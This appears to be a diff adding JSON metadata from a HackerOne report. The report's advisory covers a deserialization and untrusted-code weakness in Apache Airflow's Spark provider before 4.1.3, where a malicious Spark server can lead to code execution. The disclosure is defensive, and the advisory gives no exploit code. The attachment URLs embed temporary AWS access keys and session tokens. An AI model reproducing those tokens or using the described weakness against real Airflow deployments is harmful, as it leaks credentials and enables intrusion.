+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/igr5xyytesnxir8flaja2s5an1g6?response-content-disposition=attachment%3B%20filename%3D%22image5.png%22%3B%20filename%2A%3DUTF-8%27%27image5.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYZJN66OK%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T133735Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDjc%2B69FzlLwmf4P38M9yVHW02F1ZuaqeMH1WUUGYpJnAiBuR13c%2FRIyp3R8juUb4EiJy5Z47WJhEQg45WZJi7h4jyq6BQib%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMSWb09CFw%2B%2FLMB1ckKo4FJOJFbWTSTdr9Z1wWXU86irE%2BpCp%2FFpfUZDLv0E%2F5r4WKT0%2BJ5HUnPuXCG%2Fqhy68nlpeQxDXS3OSxoMTE5A3UY1qUHuzg5vBxl1FQAg5j0Z0MIqpaCOTcGfvgRNB4hqd8XZMb3%2BPz86%2BLcet0DBsYHrOZUOXns10OBw0J0TemBRJeeRkGvVa4kqahPw1%2Fvr3cBV6skMx2eO32V8XfKjkaQc1w7F%2BKvmW1CN2jtxPY1bVExt6ay5AY6wehBCO16TO5%2FaLjg8LIzVt8Sc%2F61hDOQFgBYY%2FlDhQ9pbFjT%2B9IipEpDYH2eqZHIXjIKUmYOxLEggF9YEL%2F2hFMIrWbCKdvVGu9%2BgUooWcHqsx1LUfNDKg9cX2kHngsO8uEDagUweCW53ip9pMpgcMEavUW6Y3HC7XPPL3ENJ1AuTBoXZvA7vSPxopQbGFyAwbsLuuF59zXwt1VVvqQyOrc2IMc9Z%2F892%2Fq4ZTQvbuPZvjiL03upNL%2BNUmapK2U208wHbtj5xCmIfOTZETCbdS%2FiwrQp2vgJWxRxFjXUfADxKKXZfy2bwGMBFt6Kdgpd%2BMs3xeK4awCFGHhma0ngpsSic8y1lZZvhOf1fP%2F1exTyqRs%2BHOdSEQAyPiUHWj%2FmKs6Z5ypwCTJq%2FSK6vteDMgwdyjbcOyC8vaAVBP8xRjHjcOaIx5ceabqg4vdsMX9J7nEPx%2FBuaKdGTajnXt8xTqtw3jlTLHIqc8YioyIDFUa0Bf6ybu41q8mP5mQS2G11ubNR6jfPN%2Bdy5G%2FSN9Nm4sBzAI2fOybhyYAzkRUwRAcAtU1skEh%2BVpbnbMB4I5WZ9zhXZYRXcO%2FnhuCCx0bFrJskhdSVAXoUNCYmQSv%2FTkiQJy4FDrMMN6KldEGOrIBSjuvVRysqLPnhKxGYSPrivaMG1jVgSn59XjM2J%2FvXyWCF%2FBdjCw1oh%2Ba9MI36zUPt%2ByHYLorBDP%2FNuJ3VOJ%2B4CQabGvstoJD5YQlWhGdb11%2FpUTutllVjq7l9gKyzcA7YFRPIcgyRjl5d%2BwC34hZBr295OSS0O8xibrJwo1MCL5kwG8MHI22A7ICAAdh%2FyxUSPU8PYz93ybsPWhrFoxS0d4O17IIrn5U9K8MkSwOQBa7wA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eaccc8e15305e0dd7b5b892466cf6b0b8da3c4684a043f51cbc3079a0c3430b4",
+      "file_size": 31386,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2648719,
+      "file_name": "image6.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bs6j1t4lj3nyydmdb48i2eh2c5n1?response-content-disposition=attachment%3B%20filename%3D%22image6.png%22%3B%20filename%2A%3DUTF-8%27%27image6.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYZJN66OK%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T133735Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDjc%2B69FzlLwmf4P38M9yVHW02F1ZuaqeMH1WUUGYpJnAiBuR13c%2FRIyp3R8juUb4EiJy5Z47WJhEQg45WZJi7h4jyq6BQib%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMSWb09CFw%2B%2FLMB1ckKo4FJOJFbWTSTdr9Z1wWXU86irE%2BpCp%2FFpfUZDLv0E%2F5r4WKT0%2BJ5HUnPuXCG%2Fqhy68nlpeQxDXS3OSxoMTE5A3UY1qUHuzg5vBxl1FQAg5j0Z0MIqpaCOTcGfvgRNB4hqd8XZMb3%2BPz86%2BLcet0DBsYHrOZUOXns10OBw0J0TemBRJeeRkGvVa4kqahPw1%2Fvr3cBV6skMx2eO32V8XfKjkaQc1w7F%2BKvmW1CN2jtxPY1bVExt6ay5AY6wehBCO16TO5%2FaLjg8LIzVt8Sc%2F61hDOQFgBYY%2FlDhQ9pbFjT%2B9IipEpDYH2eqZHIXjIKUmYOxLEggF9YEL%2F2hFMIrWbCKdvVGu9%2BgUooWcHqsx1LUfNDKg9cX2kHngsO8uEDagUweCW53ip9pMpgcMEavUW6Y3HC7XPPL3ENJ1AuTBoXZvA7vSPxopQbGFyAwbsLuuF59zXwt1VVvqQyOrc2IMc9Z%2F892%2Fq4ZTQvbuPZvjiL03upNL%2BNUmapK2U208wHbtj5xCmIfOTZETCbdS%2FiwrQp2vgJWxRxFjXUfADxKKXZfy2bwGMBFt6Kdgpd%2BMs3xeK4awCFGHhma0ngpsSic8y1lZZvhOf1fP%2F1exTyqRs%2BHOdSEQAyPiUHWj%2FmKs6Z5ypwCTJq%2FSK6vteDMgwdyjbcOyC8vaAVBP8xRjHjcOaIx5ceabqg4vdsMX9J7nEPx%2FBuaKdGTajnXt8xTqtw3jlTLHIqc8YioyIDFUa0Bf6ybu41q8mP5mQS2G11ubNR6jfPN%2Bdy5G%2FSN9Nm4sBzAI2fOybhyYAzkRUwRAcAtU1skEh%2BVpbnbMB4I5WZ9zhXZYRXcO%2FnhuCCx0bFrJskhdSVAXoUNCYmQSv%2FTkiQJy4FDrMMN6KldEGOrIBSjuvVRysqLPnhKxGYSPrivaMG1jVgSn59XjM2J%2FvXyWCF%2FBdjCw1oh%2Ba9MI36zUPt%2ByHYLorBDP%2FNuJ3VOJ%2B4CQabGvstoJD5YQlWhGdb11%2FpUTutllVjq7l9gKyzcA7YFRPIcgyRjl5d%2BwC34hZBr295OSS0O8xibrJwo1MCL5kwG8MHI22A7ICAAdh%2FyxUSPU8PYz93ybsPWhrFoxS0d4O17IIrn5U9K8MkSwOQBa7wA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1d80dd187fb2cd6283e95720436df4f29fb6327aa9a3a54822b39790c71cfd36",
+      "file_size": 144512,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2648720,
+      "file_name": "image7.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dzn2juzmeenagmqq8fnk1i6wvm6d?response-content-disposition=attachment%3B%20filename%3D%22image7.png%22%3B%20filename%2A%3DUTF-8%27%27image7.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYZJN66OK%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T133735Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDjc%2B69FzlLwmf4P38M9yVHW02F1ZuaqeMH1WUUGYpJnAiBuR13c%2FRIyp3R8juUb4EiJy5Z47WJhEQg45WZJi7h4jyq6BQib%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMSWb09CFw%2B%2FLMB1ckKo4FJOJFbWTSTdr9Z1wWXU86irE%2BpCp%2FFpfUZDLv0E%2F5r4WKT0%2BJ5HUnPuXCG%2Fqhy68nlpeQxDXS3OSxoMTE5A3UY1qUHuzg5vBxl1FQAg5j0Z0MIqpaCOTcGfvgRNB4hqd8XZMb3%2BPz86%2BLcet0DBsYHrOZUOXns10OBw0J0TemBRJeeRkGvVa4kqahPw1%2Fvr3cBV6skMx2eO32V8XfKjkaQc1w7F%2BKvmW1CN2jtxPY1bVExt6ay5AY6wehBCO16TO5%2FaLjg8LIzVt8Sc%2F61hDOQFgBYY%2FlDhQ9pbFjT%2B9IipEpDYH2eqZHIXjIKUmYOxLEggF9YEL%2F2hFMIrWbCKdvVGu9%2BgUooWcHqsx1LUfNDKg9cX2kHngsO8uEDagUweCW53ip9pMpgcMEavUW6Y3HC7XPPL3ENJ1AuTBoXZvA7vSPxopQbGFyAwbsLuuF59zXwt1VVvqQyOrc2IMc9Z%2F892%2Fq4ZTQvbuPZvjiL03upNL%2BNUmapK2U208wHbtj5xCmIfOTZETCbdS%2FiwrQp2vgJWxRxFjXUfADxKKXZfy2bwGMBFt6Kdgpd%2BMs3xeK4awCFGHhma0ngpsSic8y1lZZvhOf1fP%2F1exTyqRs%2BHOdSEQAyPiUHWj%2FmKs6Z5ypwCTJq%2FSK6vteDMgwdyjbcOyC8vaAVBP8xRjHjcOaIx5ceabqg4vdsMX9J7nEPx%2FBuaKdGTajnXt8xTqtw3jlTLHIqc8YioyIDFUa0Bf6ybu41q8mP5mQS2G11ubNR6jfPN%2Bdy5G%2FSN9Nm4sBzAI2fOybhyYAzkRUwRAcAtU1skEh%2BVpbnbMB4I5WZ9zhXZYRXcO%2FnhuCCx0bFrJskhdSVAXoUNCYmQSv%2FTkiQJy4FDrMMN6KldEGOrIBSjuvVRysqLPnhKxGYSPrivaMG1jVgSn59XjM2J%2FvXyWCF%2FBdjCw1oh%2Ba9MI36zUPt%2ByHYLorBDP%2FNuJ3VOJ%2B4CQabGvstoJD5YQlWhGdb11%2FpUTutllVjq7l9gKyzcA7YFRPIcgyRjl5d%2BwC34hZBr295OSS0O8xibrJwo1MCL5kwG8MHI22A7ICAAdh%2FyxUSPU8PYz93ybsPWhrFoxS0d4O17IIrn5U9K8MkSwOQBa7wA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c7373b2a2b4ce2c2950f559191e9bd75838da876d723ce58cb9b3681e21ce253",
+      "file_size": 18640,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2648722,
+      "file_name": "image8.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0cgc9l55q9sduevs6y1yli7ipokf?response-content-disposition=attachment%3B%20filename%3D%22image8.png%22%3B%20filename%2A%3DUTF-8%27%27image8.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYZJN66OK%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T133735Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDjc%2B69FzlLwmf4P38M9yVHW02F1ZuaqeMH1WUUGYpJnAiBuR13c%2FRIyp3R8juUb4EiJy5Z47WJhEQg45WZJi7h4jyq6BQib%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMSWb09CFw%2B%2FLMB1ckKo4FJOJFbWTSTdr9Z1wWXU86irE%2BpCp%2FFpfUZDLv0E%2F5r4WKT0%2BJ5HUnPuXCG%2Fqhy68nlpeQxDXS3OSxoMTE5A3UY1qUHuzg5vBxl1FQAg5j0Z0MIqpaCOTcGfvgRNB4hqd8XZMb3%2BPz86%2BLcet0DBsYHrOZUOXns10OBw0J0TemBRJeeRkGvVa4kqahPw1%2Fvr3cBV6skMx2eO32V8XfKjkaQc1w7F%2BKvmW1CN2jtxPY1bVExt6ay5AY6wehBCO16TO5%2FaLjg8LIzVt8Sc%2F61hDOQFgBYY%2FlDhQ9pbFjT%2B9IipEpDYH2eqZHIXjIKUmYOxLEggF9YEL%2F2hFMIrWbCKdvVGu9%2BgUooWcHqsx1LUfNDKg9cX2kHngsO8uEDagUweCW53ip9pMpgcMEavUW6Y3HC7XPPL3ENJ1AuTBoXZvA7vSPxopQbGFyAwbsLuuF59zXwt1VVvqQyOrc2IMc9Z%2F892%2Fq4ZTQvbuPZvjiL03upNL%2BNUmapK2U208wHbtj5xCmIfOTZETCbdS%2FiwrQp2vgJWxRxFjXUfADxKKXZfy2bwGMBFt6Kdgpd%2BMs3xeK4awCFGHhma0ngpsSic8y1lZZvhOf1fP%2F1exTyqRs%2BHOdSEQAyPiUHWj%2FmKs6Z5ypwCTJq%2FSK6vteDMgwdyjbcOyC8vaAVBP8xRjHjcOaIx5ceabqg4vdsMX9J7nEPx%2FBuaKdGTajnXt8xTqtw3jlTLHIqc8YioyIDFUa0Bf6ybu41q8mP5mQS2G11ubNR6jfPN%2Bdy5G%2FSN9Nm4sBzAI2fOybhyYAzkRUwRAcAtU1skEh%2BVpbnbMB4I5WZ9zhXZYRXcO%2FnhuCCx0bFrJskhdSVAXoUNCYmQSv%2FTkiQJy4FDrMMN6KldEGOrIBSjuvVRysqLPnhKxGYSPrivaMG1jVgSn59XjM2J%2FvXyWCF%2FBdjCw1oh%2Ba9MI36zUPt%2ByHYLorBDP%2FNuJ3VOJ%2B4CQabGvstoJD5YQlWhGdb11%2FpUTutllVjq7l9gKyzcA7YFRPIcgyRjl5d%2BwC34hZBr295OSS0O8xibrJwo1MCL5kwG8MHI22A7ICAAdh%2FyxUSPU8PYz93ybsPWhrFoxS0d4O17IIrn5U9K8MkSwOQBa7wA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bf37eb0a396906fc9e4e14c1e66653e95525c47eaeb7f014ae364c5f046f5183",
+      "file_size": 9720,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-10-07T20:06:46.530Z",
+  "allow_singular_disclosure_after": -84130248.7586005,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "zy9ard3",
+    "eminfidan"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 86381,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/apache/airflow",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "can_manage?": false,
+    "can_export?": false,
+    "can_add_comment?": false,
+    "can_request_decision_review_without_strict_acl_mode?": false,
+    "can_request_decision_review?": false,
+    "can_reject_decision_review?": false,
+    "can_change_state?": false,
+    "can_reopen?": false,
+    "can_award_bounty?": false,
+    "can_award_swag?": false,
+    "can_suggest_bounty_amount?": false,
+    "can_create_dupe_window_bounty?": false,
+    "can_assign_to_user?": false,
+    "can_assign_to_h1_triage?": false,
+    "can_hide_timeline?": false,
+    "can_agree_on_going_public?": false,
+    "can_cancel_disclosure_request?": false,
+    "can_be_publicly_disclosed?": false,
+    "can_post_internal_comments?": false,
+    "can_manage_common_responses?": false,
+    "can_use_common_responses?": false,
+    "can_reassign_to_team?": false,
+    "can_change_title?": false,
+    "can_change_vulnerability_information?": false,
+    "can_change_weakness?": false,
+    "can_be_manually_disclosed?": false,
+    "can_clone?": false,
+    "can_close_as_na?": false,
+    "can_close_as_duplicate?": false,
+    "can_close_as_informative?": false,
+    "can_close_as_spam?": false,
+    "can_close_as_resolved?": false,
+    "can_ban_researcher?": false,
+    "can_create_severity?": false,
+    "can_close_comments?": false,
+    "can_change_structured_scope?": false,
+    "can_manage_collaborators?": false,
+    "can_view_bounty_weights?": false,
+    "can_redact?": false,
+    "can_view_credential_account_details?": false,
+    "can_request_retest?": false,
+    "can_cancel_retest?": false,
+    "can_submit_draft?": false,
+    "can_delete_draft?": false,
+    "can_change_to_pending_program_review_state?": false,
+    "can_request_code_review?": false,
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "can_change_pentest": false,
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 342180,
+      "category": "team",
+      "content": "Affected versions:\n\n- Apache Airflow Spark Provider before 4.1.3\n\nDescription:\n\nDeserialization of Untrusted Data, Inclusion of Functionality from Untrusted Control Sphere vulnerability in Apache Software Foundation Apache Airflow Spark Provider.\n\nWhen the Apache Spark provider is installed on an Airflow deployment, an Airflow user that is authorized to configure Spark hooks can effectively run arbitrary code on the Airflow node by pointing it at a malicious Spark server. Prior to version 4.1.3, this was not called out in the documentation explicitly, so it is possible that administrators provided authorizations to configure Spark hooks without taking this into account. We recommend administrators to review their configurations to make sure the authorization to configure Spark hooks is only provided to fully trusted users.\n\nTo view the warning in the docs please visit  https://airflow.apache.org/docs/apache-airflow-providers-apache-spark/4.1.3/connections/spark.html",
+      "updated_at": "2023-09-07T20:05:15.362Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 2032618,
+        "username": "pr0tag0nist",
+        "name": "p h",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2021-10-18T10:02:41.859Z",
+        "url": "https://hackerone.com/pr0tag0nist",
+        "hackerone_triager": false,
+        "hackerone_employee": true,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
